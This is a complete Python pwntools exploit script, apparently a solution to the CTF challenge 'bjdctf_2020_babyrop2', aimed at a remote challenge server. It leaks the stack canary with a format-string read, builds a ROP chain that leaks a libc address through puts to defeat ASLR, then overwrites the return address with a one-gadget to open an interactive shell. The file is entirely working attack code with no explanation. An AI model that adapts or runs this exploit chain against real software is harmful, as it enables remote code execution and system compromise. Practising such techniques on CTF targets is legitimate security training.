from pwn import *

context.log_level = "info"
elf = ELF("./bjdctf_2020_babyrop2")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")

pop_rdi_ret = 0x0000000000400993 # pop rdi ; ret

#sock = process(elf.path)
sock = remote("node4.buuoj.cn", 29436)

sock.sendafter(b"I'll give u some gift to help u!\n", b"%7$lx\x00")
canary = int(b"0x" + sock.recvline()[:-1], 16)
log.info("canary = " + hex(canary))

payload = b"A" * 0x18
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi_ret)
payload += p64(elf.got["read"])
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["_start"])
sock.sendafter(b"Pull up your sword and tell me u story!\n", payload)
leak_addr = u64(sock.recvline()[:-1].ljust(8,b"\x00"))
log.info("leak_addr = " + hex(leak_addr))
libc_base_addr = leak_addr - libc.sym["read"]
log.info("libc_base_addr = " + hex(libc_base_addr))

sock.sendafter(b"I'll give u some gift to help u!\n", b"%7$lx\x00")
canary = int(b"0x" + sock.recvline()[:-1], 16)
log.info("canary = " + hex(canary))

payload = b"A" * 0x18
payload += p64(canary)
payload += p64(0)
payload += p64(libc_base_addr + 0x45216) # one gadget addr
sock.sendafter(b"Pull up your sword and tell me u story!\n", payload)

sock.interactive()
